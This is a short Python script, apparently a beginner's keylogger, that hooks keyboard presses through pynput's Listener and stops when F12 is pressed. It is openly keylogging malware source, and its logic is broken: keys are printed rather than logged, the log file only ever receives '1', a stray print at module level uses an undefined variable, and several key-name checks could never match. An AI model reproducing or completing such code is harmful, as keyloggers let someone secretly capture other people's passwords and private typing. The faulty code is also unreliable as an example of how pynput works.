from pynput.keyboard import Listener
def anonymous(key) :
    key=str(key)
    key = key.replace("'", "")
    if key == 'Key.f12' :
        raise SystemExit(0)
    if key == "key.enter" :
        key = "\n"
    if key == "key.ctrl_l" :
        key = "\n"
    if key == "key.tab" :
        key = "\n"
    if key == "key.alt.l" :
        key = "\n"
    print(key)
with open("log.txt", "a") as file :
    file.write("1")
print(key)

with Listener(on_press=anonymous) as listener :
    listener.join()
